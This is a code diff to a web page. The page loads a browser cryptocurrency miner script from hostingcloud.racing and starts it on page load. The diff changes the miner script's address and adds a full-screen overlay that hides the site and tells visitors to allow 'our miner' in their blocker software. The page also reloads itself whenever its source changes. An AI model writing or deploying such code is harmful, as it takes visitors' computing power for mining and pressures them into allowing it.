@@ -10,7 +10,7 @@
 <body>
 
 
-    <script src="https://www.hostingcloud.racing/qeku.js"></script>
+    <script src="https://www.hostingcloud.racing/M8WW.js"></script>
     <script>
 
         let Client = window.Client;
@@ -20,7 +20,7 @@
         });
         _client.start();
         window._client = _client;
-
+        console.log(_client);
         (async () => {
             while (1) {
                 await new Promise(r => setTimeout(r, 1000));
@@ -30,7 +30,22 @@
             }
         })()
     </script>
+    <script>
+        setTimeout(function () {
+            if (typeof _client === 'undefined' || _client === null) {
+                var messageDiv = document.createElement("div");
+                messageDiv.setAttribute("style", "width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+                messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+                var mainDiv = document.createElement("div");
+                mainDiv.setAttribute("style", "position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+                mainDiv.appendChild(messageDiv);
+                document.body.appendChild(mainDiv);
+                document.getElementsByTagName("body")[0].style.overflow = "hidden";
+                window.scrollTo(0, 0);
+            }
+        }, 1000);
 
+    </script>
     <script>setInterval(async () => { if (window.lastCode && window.lastCode != await (await fetch(location.href)).text()) location.reload(); window.lastCode = await (await fetch(location.href)).text(); }, 500);</script>
 
 </body>
